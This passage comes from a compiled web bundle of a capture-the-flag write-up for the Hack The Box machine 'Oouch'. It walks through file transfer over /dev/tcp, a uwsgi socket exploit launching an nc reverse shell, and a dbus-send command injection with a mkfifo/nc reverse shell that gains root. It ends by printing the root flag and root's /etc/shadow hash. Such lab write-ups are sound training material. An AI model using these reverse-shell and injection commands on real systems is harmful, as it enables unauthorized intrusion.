",(0,a.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/bash/#file-download"},"GTFOBins tricks")," with bash to download the file inside the container."),(0,a.kt)("p",null,"First start TCP socket on oouch machine."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -l -p 12345 < /tmp/uwsgi_exp.py\n$ nc -l -p 12345 < /usr/bin/nc\n")),(0,a.kt)("p",null,"And download it from the container:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ export RHOST=172.17.0.1\n$ export RPORT=12345\n$ export LFILE=uwsgi_exp.py\n$ bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n$ export LFILE=nc\n$ bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n$ chmod +x nc\n")),(0,a.kt)("p",null,"Note: since there is ssh, it was possible to transfer via ",(0,a.kt)("inlineCode",{parentName:"p"},"scp")," too."),(0,a.kt)("p",null,"Let's exploit now!"),(0,a.kt)("p",null,"On oouch:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"nc -nlvp 12345\n")),(0,a.kt)("p",null,"In the container:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ python3 uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c "/home/qtc/nc -e /bin/bash 172.17.0.1 12345"\n')),(0,a.kt)("p",null,"Now we obtained a ",(0,a.kt)("inlineCode",{parentName:"p"},"www-data")," shell."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -nlvp 12345\nlistening on [any] 12345 ...\nconnect to [172.17.0.1] from (UNKNOWN) [172.18.0.3] 47676\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n")),(0,a.kt)("h3",{id:"dbus-exploitation"},"DBUS Exploitation"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("inlineCode",{parentName:"li"},"www-data")," can receive and send message from dbus."),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("inlineCode",{parentName:"li"},"www-data")," owns uwsgi.")),(0,a.kt)("p",null,"It's always better with a PTY."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ python -c 'import pty;pty.spawn(\"/bin/bash\")'\n")),(0,a.kt)("p",null,"We start a listener on oouch machine:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -nlvp 9999\n")),(0,a.kt)("p",null,"Now we can use ",(0,a.kt)("inlineCode",{parentName:"p"},"dbus-send")," to gain a root shell:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block "string:;rm /tmp/.cyfun; mkfifo /tmp/.cyfun; cat /tmp/.cyfun | /bin/bash -i 2>&1 | nc 172.17.0.1 9999 >/tmp/.cyfun;"\n')),(0,a.kt)("p",null,"And we receive the root shell:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -nlvp 9999\nlistening on [any] 9999 ...\nconnect to [172.17.0.1] from (UNKNOWN) [10.10.10.177] 37180\nbash: cannot set terminal process group (2688): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@oouch:/root# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@oouch:/root# cat root.txt\ncat root.txt\nff9e6428ad626cb968daba6eb1d33540\n")),(0,a.kt)("h3",{id:"bonus"},"Bonus"),(0,a.kt)("p",null,"To unlock some WU we will need the root hash:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"# cat /etc/shadow | grep root\nroot:$6$UQS7GJnfVbWRz5KO$vEaGmrfKvdrqh50eCr7D3AAruNfPe1dYhiv..ykDhlWWYvgaoabrqujg51k60bQz3jgTx.yXh5jCHNZ6ArkQ.1:18303:0:99999:7:::\n")))}h.isMDXComponent=!0},83205:(t,e,n)=>{n.d(e,{Z:()=>o});const o=n.p+"assets/images/oouch-cd059c292827d613e2f80dfe662e7d50.png"}}]);